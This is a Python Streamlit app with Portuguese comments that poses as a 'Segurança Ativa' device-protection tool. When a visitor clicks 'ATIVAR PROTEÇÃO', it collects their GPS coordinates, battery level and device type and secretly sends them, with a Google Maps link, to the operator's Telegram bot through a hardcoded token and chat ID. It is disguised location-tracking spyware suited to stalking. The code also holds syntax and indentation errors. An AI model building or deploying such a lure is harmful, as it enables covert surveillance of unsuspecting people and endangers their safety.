import streamlit as st
import requests
import time
import pandas as pd
from streamlit_js_eval import get_geolocation, streamlit_js_eval

# --- CONFIGURAÇÕES DO TELEGRAM ---
# COLOQUE SEUS DADOS AQUI:
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage?chat_id={SEU_ID}&text={mensagem}&parse_mode=Markdown"
    requests.get(url)

# --- CONFIGURAÇÕES VISUAIS ---
st.set_page_config(page_title="Segurança Ativa"./h2>page_icon="🛡️")

st.markdown("""
    <style>
    .stButton>button { width: 100%; background-color: #2196F3; color: white; height: 3.5em; border-radius: 12px; font-weight: bold; }
    .footer { position: fixed; left: 0; bottom: 0; width: 100%; color: #BDBDBD; text-align: center; font-size: 10px; padding: 20px; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("### Segurança Ativa 🛡️")
st.divider()

col1, col2, col3 = st.columns([0.1, 0.8, 0.1])
with col2:
    st.markdown("<div style='text-align: center;'><img src='https://cdn-icons-png.flaticon.com/512/1063/1063220.png' width='100'></div>", unsafe_allow_html=True)
st.markdown("<h2 style='text-align: center; color: #2e7d32;'>Segurança Ativa</h2>", unsafe_allow_html=True)
    
    if 'ativo' not in st.session_state:
        st.markdown("<p style='text-align: center;'>Verificação de  Integridade do sistema em tempo real.</p>", unsafe_allow_html=True)
        if st.button("ATIVAR PROTEÇÃO"):
            st.session_state['ativo'] = True
            st.rerun()
    
    elif 'ativo' in st.session_state and 'localizado' not in st.session_state:
        # Captura de Dados
        loc = get_geolocation()
        bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="bat")
        user_agent = streamlit_js_eval(js_expressions="navigator.userAgent", key="dev")
        
        barra = st.progress(0)
        for i in range(100):
            time.sleep(0.01)
            barra.progress(i + 1)
        
        if loc and 'coords' in loc:
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            dispositivo = user_agent.split(')')[0].split('(')[-1] if user_agent else "Desconhecido"
            bat_nivel = bateria if bateria else "N/A"
            
            # MONTA A MENSAGEM PARA O SEU TELEGRAM
            msg = f"🔔 Relatório de Segurança Ativa!\n\n"
            msg += f"📱 Aparelho: {dispositivo}\n"
            msg += f"🔋 Bateria: {bat_nivel}%\n"
            msg += f"📍 Mapa: https://www.google.com/maps?q={lat},{lon}\n"
            msg += f"🌐 Coordenadas: {lat}, {lon}"
            
            enviar_telegram(msg) # ENVIA PARA VOCÊ
            
            st.session_state['dados'] = {'lat': lat, 'lon': lon, 'bat': bat_nivel, 'dev': dispositivo}
            st.session_state['localizado'] = True
            st.rerun()
        else:
            st.info("Aguardando permissão de GPS... Verifique o topo do navegador.")

    else:
        st.success(f"Proteção Ativa no {st.session_state['dados']['dev']}")
        df = pd.DataFrame({'lat': [st.session_state['dados']['lat']], 'lon': [st.session_state['dados']['lon']]})
        st.map(df)
        if st.button("DESATIVAR"):
            del st.session_state['ativo']
            del st.session_state['localizado']
            st.rerun()

st.markdown('<div class="footer">SISTEMA DE SEGURANÇA INTEGRADO | Miamy ©2026</div>', unsafe_allow_html=True)
